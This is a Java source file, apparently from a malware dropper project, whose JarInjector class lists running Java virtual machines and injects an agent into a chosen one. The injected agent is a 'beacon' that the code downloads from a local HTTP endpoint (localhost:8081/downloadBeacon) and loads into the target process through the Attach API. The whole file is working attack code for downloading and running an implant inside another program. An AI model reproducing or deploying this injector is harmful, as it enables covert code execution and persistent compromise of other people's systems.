package dropper.injector;

import com.sun.tools.attach.*;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Collection;

import static dropper.utils.HttpUtil.downloadFileHttp;

public class JarInjector {
	public Collection<String> getInjectableJars() {
		Collection<VirtualMachineDescriptor> vms = VirtualMachine.list();
		Collection<String> vmNames = new ArrayList<>();
		for (VirtualMachineDescriptor vm : vms) {
			vmNames.add(vm.displayName());
		}
		return vmNames;
	}

	public boolean injectAgentToJar(String jarName, String agentName) {
		Collection<VirtualMachineDescriptor> vms = VirtualMachine.list();
		for (VirtualMachineDescriptor vmd : vms) {
			if (vmd.displayName().equals(jarName)) {
				try {
					VirtualMachine jvm = VirtualMachine.attach(vmd.id());
					String agentUrl = "http://localhost:8081/downloadBeacon";
					File agent = new File(agentName);
					downloadFileHttp(agentUrl, agent.getPath());
					jvm.loadAgent(agent.getPath());
					jvm.detach();
					return true;
				} catch (AttachNotSupportedException e) {
					return false;
				} catch (IOException e) {
					return false;
				} catch (AgentLoadException e) {
					return false;
				} catch (AgentInitializationException e) {
					return false;
				}
			}
		}
		return false;
	}
}
